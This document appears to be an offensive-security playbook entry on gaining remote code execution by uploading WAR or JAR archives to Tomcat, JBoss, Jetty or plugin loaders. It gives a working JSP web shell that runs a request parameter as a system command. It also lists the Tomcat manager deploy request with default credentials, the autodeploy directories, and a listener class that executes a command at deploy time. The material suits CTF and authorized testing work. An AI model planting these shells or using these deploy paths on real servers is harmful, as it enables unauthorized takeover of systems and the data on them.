# JAR/WAR Deploy Upload — the application-archive write

## The shape — the upload IS a deployable app artifact

`.war`, `.jar`, `.ear` upload to a servlet container or plugin loader —
Tomcat manager deploy, custom plugin systems, CI artifact intake — the
archive is dropped into a deployment dir and the container expands+loads
it.

```
myshell.war containing:
  WEB-INF/web.xml      → servlet mapping
  shell.jsp            → the JSP servlet
  WEB-INF/classes/...  → compiled classes
```

## Tomcat manager — the classic deploy path

```
PUT /manager/text/deploy?path=/x     — WAR upload via manager app
```

If the manager is reachable and creds known/default (`tomcat:s3cret`,
`admin:admin`), the WAR deploy is direct RCE. `web-auth-session` for the
creds; this file covers the WAR shape.

## JSP content — the minimal servlet

```jsp
<%@ page import="java.io.*" %>
<%
  String c = request.getParameter("c");
  if (c != null) {
    Process p = Runtime.getRuntime().exec(c);
    BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String l; while ((l = r.readLine()) != null) out.println(l);
  }
%>
```

In a WAR at `x.jsp` → `GET /x/x.jsp?c=id` executes.

## web.xml — the servlet mapping declaration

```xml
<web-app>
  <servlet><servlet-name>s</servlet-name>
    <servlet-class>ShellServlet</servlet-class></servlet>
  <servlet-mapping><servlet-name>s</servlet-name>
    <url-pattern>/s</url-pattern></servlet-mapping>
</web-app>
```

Maps a compiled class — the class file itself is the exec. For CTF, JSP
is simpler (no compilation needed).

## The drop-in dirs — where a WAR lands to autodeploy

```
$CATALINA_BASE/webapps/x.war      → auto-expands+deploys
$JBOSS_HOME/standalone/deployments/x.war
$JETTY_BASE/webapps/x.war
```

The upload path traversal into `webapps/` = WAR deploy without the
manager — `path-traversal.md` for the path control.

## .jar as plugin — non-webapp containers

- plugin systems loading jars from `plugins/` (Minecraft, Jenkins, custom)
- a jar needs `META-INF/services/` or the loader's plugin interface — a
  JSP-less exec inside `static` init or `Plugin.onEnable()`
- `module-info`/`MANIFEST.MF` declares the entrypoint class

## Exploit detail — the class that runs on load

```java
public class Evil implements ServletContextListener {
  public void contextInitialized(ServletContextEvent e) {
    Runtime.getRuntime().exec("...");
  }
}
```

`web.xml` `<listener>` — runs at deploy time, no request needed.

## Falsifiers

- the upload lands outside deploy dirs and no deploy endpoint exists
- the container has autodeploy off AND manager locked

## Output to record

- deploy dir location + which artifact type it scans + the execution
  trigger (request vs listener)
